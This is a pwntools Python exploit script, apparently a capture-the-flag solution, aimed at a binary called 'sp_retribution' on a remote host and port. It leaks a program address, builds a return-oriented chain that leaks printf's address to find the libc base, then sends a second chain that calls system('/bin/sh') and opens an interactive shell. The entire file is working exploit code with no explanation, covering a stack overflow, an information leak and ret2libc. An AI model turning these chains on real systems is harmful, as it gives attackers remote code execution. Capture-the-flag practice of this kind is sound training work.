#!/usr/bin/env python3

from pwn import *

exe = ELF("./sp_retribution_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
#p= process()
p = remote('94.237.59.119',56080)
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000000AEB
#           ''')
p.sendlineafter(b'>> ',b'2')
payload1 = b'a'*8
p.sendafter(b'y = ',payload1)
p.recvuntil(payload1)

leak = u64(p.recv(6).ljust(8,b'\x00'))

exe.address = leak - 0xd70

log.info(f"exe address: {hex(exe.address)}")
pop_rdi = 0x0000000000000d33
print(type(pop_rdi))
payload2 = b'a'*0x50
payload2 += p64(0)
payload2 += p64(pop_rdi + exe.address)
payload2 += p64(exe.got.printf)
payload2 += p64(exe.plt.puts)

payload2 += p64(exe.sym.main)

input()
p.sendafter(b'(y/n): ',payload2)

p.recvuntil(b'Coordinates have been reset!')
p.recvline()

leak_printf = u64(p.recv(6).ljust(8,b'\x00'))
libc.address = leak_printf - libc.sym.printf

log.info(f"lb: {hex(libc.address)}")

p.sendlineafter(b'>> ',b'2')
p.sendafter(b'y = ',b'aaa')

payload3 = b'a'*0x50
payload3 += p64(0)
payload3 += p64(0x0000000000021112+libc.address)
payload3 += p64(next(libc.search(b'/bin/sh\x00')))
payload3 += p64(0x0000000000021112+libc.address+1)
payload3 += p64(libc.sym.system)
input("payload3")
p.send(payload3)




p.interactive()
